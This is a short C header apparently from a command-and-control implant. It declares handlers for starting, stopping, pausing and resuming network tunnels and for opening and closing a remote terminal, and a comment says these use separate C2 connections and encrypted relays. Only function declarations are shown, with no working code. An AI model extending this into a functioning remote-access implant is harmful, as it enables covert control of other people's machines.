#ifndef TASKS_NET_H
#define TASKS_NET_H

#include "msgpack.h"
#include <stdint.h>

/// Network command handlers — tunnel and terminal
/// These launch background threads with separate C2 connections
/// and bidirectional AES-CTR encrypted relays

int task_tunnel_start(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_tunnel_stop(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_tunnel_pause(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_tunnel_resume(const uint8_t* data, uint32_t data_len, mp_writer_t* w);

int task_terminal_start(const uint8_t* data, uint32_t data_len, mp_writer_t* w);
int task_terminal_stop(const uint8_t* data, uint32_t data_len, mp_writer_t* w);

#endif // TASKS_NET_H
